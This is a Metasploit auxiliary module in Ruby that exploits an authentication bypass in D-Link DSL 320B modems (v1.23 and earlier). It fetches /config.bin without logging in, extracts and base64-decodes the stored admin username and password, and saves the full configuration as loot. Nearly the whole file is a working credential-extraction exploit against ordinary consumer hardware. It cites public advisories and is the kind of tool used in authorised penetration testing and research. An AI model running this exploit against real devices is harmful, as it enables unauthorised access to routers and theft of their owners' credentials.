##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'D-Link DSL 320B Password Extractor',
      'Description' => %q{
          This module exploits an authentication bypass vulnerability in D-Link DSL 320B
        <=v1.23. This vulnerability allows to extract the credentials for the remote
        management interface.
      },
      'References'  =>
        [
          [ 'EDB', '25252' ],
          [ 'OSVDB', '93013' ],
          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-018' ],
          [ 'URL', 'http://www.dlink.com/de/de/home-solutions/connect/modems-and-gateways/dsl-320b-adsl-2-ethernet-modem' ],
        ],
      'Author'      => [
        'Michael Messner <devnull[at]s3cur1ty.de>'
      ],
      'License'     => MSF_LICENSE
    )
  end

  def run
    vprint_status("#{rhost}:#{rport} - Trying to access the configuration of the device")

    #download configuration
    begin
      res = send_request_cgi({
        'uri' => '/config.bin',
        'method' => 'GET'
      })

      return if res.nil?
      return if (res.headers['Server'].nil? or res.headers['Server'] !~ /micro_httpd/)
      return if (res.code == 404)

      if res.body =~ /sysPassword value/ or res.body =~ /sysUserName value/
        if res.body !~ /sysPassword value/
          print_status("#{rhost}:#{rport} - Default Configuration of DSL 320B detected - no password section available, try admin/admin")
        else
          print_good("#{rhost}:#{rport} - Credentials successfully extracted")
        end

        #store all details as loot -> there is some usefull stuff in the response
        loot = store_loot("dlink.dsl320b.config","text/plain", rhost, res.body)
        print_good("#{rhost}:#{rport} - Configuration of DSL 320B downloaded to: #{loot}")

        user = ""
        pass = ""

        res.body.each_line do |line|
          if line =~ /\<sysUserName\ value\=\"(.*)\"\/\>/
            user = $1
            next
          end
          if line =~ /\<sysPassword\ value\=\"(.*)\"\/\>/
            pass = $1
            pass = Rex::Text.decode_base64(pass)
            print_good("#{rhost}:#{rport} - Credentials found: #{user} / #{pass}")
            report_auth_info(
              :host => rhost,
              :port => rport,
              :sname => 'http',
              :user => user,
              :pass => pass,
              :active => true
            )
          end
        end
      end
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return
    end


  end
end
